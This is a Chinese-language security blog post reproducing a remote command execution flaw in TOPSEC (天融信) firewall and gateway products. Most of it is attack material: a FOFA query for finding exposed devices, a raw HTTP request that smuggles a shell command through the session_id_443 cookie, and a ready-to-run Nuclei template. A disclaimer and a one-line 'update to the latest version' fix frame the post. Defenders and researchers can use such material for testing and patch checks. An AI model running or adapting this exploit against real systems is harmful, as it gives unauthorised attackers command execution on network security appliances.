#  【漏洞复现】天融信TOPSEC Cookie 远程命令执行   
原创 rain  知黑守白   2024-01-04 00:01  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
**此内容仅供技术交流与学习，请勿用于未经授权的场景。请遵循相关法律与道德规范。任何因使用本文所述技术而引发的法律责任，与本文作者及发布平台无关。如有内容争议或侵权，请及时私信我们！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
天融信TOPSEC解决方案包括综合管理系统，各类安全产品如防火墙、VPN、安全网关、宽带管理、入侵检测、内容过滤、个人安全套件以及综合安全审计系统等多种安全功能。该系统Cookie 处存在RCE漏洞，会导致服务器失陷。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoRgia4PYz9ZDzkrzwXibASlbevKRXQNItj98DXyJEicdcnWtVsyZNNekiaPg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
FoFa  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
```
GET /cgi/maincgi.cgi?Url=check HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Cookie: session_id_443=1|pwd  > /www/htdocs/site/image/123.txt;
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoRwc7xRGDRjV91WGNB4Psiaibfkib7IYx4B5FMrqPMBqVV8zIX4S8J5k0hA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoRjh82A60mACmFewurWEPU5Nicib9rAuplsFicktLT9MIv4RS5zRbB3icRew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
Nuclei Poc  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
id: topsec-cookie-rce

info:
  name: 天融信TOPSEC Cookie 远程命令执行漏洞
  author: rain
  severity: critical
  metadata:
    fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"

http:
  - raw:
      - |
        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
        Host: {{Hostname}}
        Cookie: session_id_443=1|echo 'test' > /www/htdocs/site/image/test.txt;
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
      - |
        GET /site/image/test.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body_2, 'test')"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
修复建议  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
更新至最新版本：确保你的系统版本处于最新状态。厂商通常会发布包含安全修复的更新，及时应用这些更新以确保系统的安全性。  
  
